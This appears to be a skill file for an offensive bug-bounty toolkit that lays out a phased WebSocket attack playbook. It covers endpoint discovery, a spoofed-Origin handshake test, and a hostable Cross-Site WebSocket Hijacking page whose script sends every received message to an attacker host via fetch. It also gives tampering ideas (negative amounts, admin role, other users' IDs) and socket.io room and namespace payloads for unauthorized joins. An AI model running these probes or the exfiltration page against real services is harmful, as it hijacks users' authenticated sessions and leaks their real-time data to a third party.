---
name: k1nzr3c0n-hunt-websocket
description: "WebSocket security hunting skill. Covers CSWSH (Cross-Site WebSocket Hijacking), no per-message auth, message tampering, socket.io namespace/room bypass, handshake-layer upgrade smuggling. Socket.io packet prefix details (40/42). Use wscat or websocat for testing."
tags: [websocket, cswsh, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — WebSocket Security

> **CSWSH**: browser makes cross-site WebSocket connection — cookies sent automatically.
> **wscat**: `npm install -g wscat` | **websocat**: install from github.com/vi/websocat.

---

## Crown Jewels

```
Priority 1 — CSWSH: hijack authenticated WebSocket from attacker's page → read real-time data
Priority 2 — No per-message authentication: messages processed without session validation
Priority 3 — Message tampering: modify role/amount/action in WS messages
Priority 4 — socket.io room bypass: subscribe to room without authorization
Priority 5 — WS protocol upgrade smuggling: HTTP→WS upgrade via request smuggling
```

---

## Phase 0 — Discover WebSocket Endpoints

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_ws_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

RUNS_BASE="/app/runs"
echo "=== WebSocket Endpoint Discovery ==="

# From JS analyst
JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"
[ -d "$JS_DIR" ] && \
  grep -hoP '(?:new WebSocket|io\.connect|socket\.io|ws://|wss://)[^"\x27\s]{0,100}' \
    "$JS_DIR"/*.js 2>/dev/null | sort -u | tee "$HUNT/ws_endpoints.txt"

# Common socket.io paths
for EP in /socket.io/ /ws/ /websocket /realtime /live /chat /notifications; do
  STATUS=$(curl -sk -o /dev/null -w '%{http_code}' "https://${TARGET}${EP}")
  [ "$STATUS" -lt 400 ] && echo "  [$STATUS] $EP"
done
```

## Phase 1 — CSWSH (Cross-Site WebSocket Hijacking)

```bash
echo "=== CSWSH Test ==="
WS_EP="${WS_ENDPOINT:-wss://${TARGET}/ws}"
SESSION_COOKIE="${SESSION_COOKIE:-}"

# Test 1: Does WS handshake validate Origin?
echo "Testing WebSocket with attacker Origin:"
curl -sk "https://${TARGET}" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Origin: https://evil.com" \
  -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Cookie: ${SESSION_COOKIE}" \
  -I | grep -E '^HTTP|^Sec-WebSocket|^Upgrade' | head -5

echo ""
echo "CSWSH PoC (host on attacker domain):"
cat << 'HTML'
<!DOCTYPE html>
<html>
<script>
var ws = new WebSocket('wss://TARGET/ws');
ws.onopen = function() {
  ws.send('{"type":"subscribe","channel":"notifications"}');
};
ws.onmessage = function(e) {
  // Exfiltrate all messages to attacker
  fetch('https://ATTACKER/log?data=' + encodeURIComponent(e.data));
};
</script>
</html>
HTML
```

## Phase 2 — Connect and Test

```bash
echo "=== WebSocket Connection Tests ==="
WS_EP="${WS_ENDPOINT:-wss://${TARGET}/ws}"

# Connect with wscat
echo "Connect with cookie auth:"
echo "  wscat -c '${WS_EP}' -H 'Cookie: ${SESSION_COOKIE:-}'"
echo ""
echo "Connect without auth (test unauthenticated access):"
echo "  wscat -c '${WS_EP}'"
echo ""

# Websocat (more feature-rich)
echo "Websocat:"
echo "  websocat '${WS_EP}' --header 'Cookie: ${SESSION_COOKIE:-}'"
```

## Phase 3 — Message Tampering

```bash
echo "=== WebSocket Message Tampering ==="
echo "Use Burp Suite to intercept WS messages:"
echo ""
echo "Common tampering targets:"
echo "  1. {'action': 'chat', 'message': 'hello'} → modify message to XSS payload"
echo "  2. {'amount': 100, 'to': 'user_id'} → change amount to negative"
echo "  3. {'role': 'user'} → change to 'admin'"
echo "  4. {'user_id': 123} → change to another user's ID"
echo ""
echo "Burp WebSocket interception:"
echo "  Proxy → WebSockets history → right-click → 'Intercept incoming messages'"

echo ""
echo "=== socket.io Packet Testing ==="
echo "socket.io packet types:"
echo "  0 = open (connection established)"
echo "  1 = close"
echo "  2 = ping"
echo "  3 = pong"
echo "  4 = message"
echo "  40 = connect (namespace)"
echo "  42 = event"
echo "  43 = ack"
echo ""
echo "Join a room/namespace without authorization:"
echo "  Send: 40/admin,{}"      # Connect to /admin namespace
echo "  Send: 42[\"join\",{\"room\":\"admin_room\"}]"
```

## Phase 4 — socket.io Room Bypass

```bash
echo "=== socket.io Room/Namespace Bypass ==="
SOCKETS_EP="${WS_ENDPOINT:-wss://${TARGET}/socket.io/?EIO=4&transport=websocket}"

# Try subscribing to admin/private rooms
ROOMS=("admin" "internal" "debug" "private" "staff" "payments")
for ROOM in "${ROOMS[@]}"; do
  echo "  Trying room: $ROOM"
  echo "  Send: 42[\"join\", \"${ROOM}\"]"
  echo "  Send: 40/${ROOM},{}"
  echo "  Watch: does server send room messages back?"
done
```

## Gate 0

```bash
echo "=== WebSocket Gate 0 ==="
echo "  □ CSWSH: WS connection accepted from attacker origin"
echo "  □ CSWSH: authenticated data received from cross-site connection"
echo "  □ No auth: messages processed without valid session"
echo "  □ Room bypass: private room messages received without authorization"
echo "  □ Tampering: modified message accepted and executed server-side"
echo "  □ Impact: data exfil, unauthorized action, or ATO via WS"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
CSWSH on [wss://target.com/ws]: no Origin header validation — attacker's cross-site page receives authenticated real-time notifications
socket.io room authorization bypass: subscribing to ['admin_room'] without authentication returns sensitive admin event data
WebSocket message tampering: amount field in transfer message not validated server-side, enabling negative transfer
```
